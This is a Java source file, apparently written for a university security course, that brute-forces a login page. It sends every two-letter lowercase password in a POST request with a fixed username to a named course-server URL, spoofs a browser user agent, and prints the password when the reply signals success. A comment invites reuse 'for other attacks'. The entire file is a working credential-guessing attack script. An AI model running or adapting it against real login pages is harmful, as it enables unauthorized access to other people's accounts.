/*
 * OnlinePwFinder performs an online attack to a webpage providing username and trying passwords by brute force.
 */
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.paukov.combinatorics3.Generator;

public class OnlinePwFinder {
	private static final String USER_AGENT = "Chrome/63.0.3239.132"; //version of browser
	private static final String POST_URL = "http://cs5339.cs.utep.edu/longpre/loginScreen.php";//url of victim website
	private static final String POST_PARAMS = "un=jonathan69_-mBS&pw="; // parameters to be passed: username & password

	/*
	 * Onlineattack sends post requests to crack a username password
	 * This method is for passwords of length 2 using only letters from a to z and lowercase
	 */
	public static void onlineAttack() throws IOException, InterruptedException{
		String pw = "";
		try {
			//Generate all possible combinations
			List<List<String>> permutations = Generator
					.permutation("a", "b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t",
							"u","v","w","x","y","z")
					.withRepetitions(2)
					.stream()
					.collect(Collectors.<List<String>>toList());
			for(int j =0; j<permutations.size();j++){//for all combinations
				for(int k=1;k<permutations.get(j).size();k++){//generate password string
					pw = permutations.get(j).get(k-1)+permutations.get(j).get(k);
					sendPOST(pw);// generate post request
					TimeUnit.SECONDS.sleep(1);//sleep 1 second after each request
				}
			}
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		}
	}
	/*
	 * Send a post request
	 */
	private static void sendPOST(String pw) throws IOException {
		URL obj = new URL(POST_URL);//set url
		String password = POST_PARAMS + pw;//set password
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
		con.setRequestMethod("POST");
		con.setRequestProperty("User-Agent", USER_AGENT); //connect to url
		// For POST only - START
		con.setDoOutput(true);
		OutputStream os = con.getOutputStream();
		os.write(password.getBytes());
		os.flush();
		os.close();
		// For POST only - END
		int responseCode = con.getResponseCode(); //response code of request
		if (responseCode == HttpURLConnection.HTTP_OK) { //success
			BufferedReader in = new BufferedReader(new InputStreamReader(
					con.getInputStream()));
			String inputLine;
			StringBuffer response = new StringBuffer();
			while ((inputLine = in.readLine()) != null) 
				response.append(inputLine); //append response
			in.close();
			//for this specific website, successful password prints the number of attempts, modify for other attacks
			if(response.toString().contains("attempts")){ 
				System.out.println("password is " + pw +" POST Response Code :: " + responseCode);//print password
				System.out.println(response.toString());//print response
			}
		} 
		else
			System.out.println("POST request not worked");//fail
	}
}



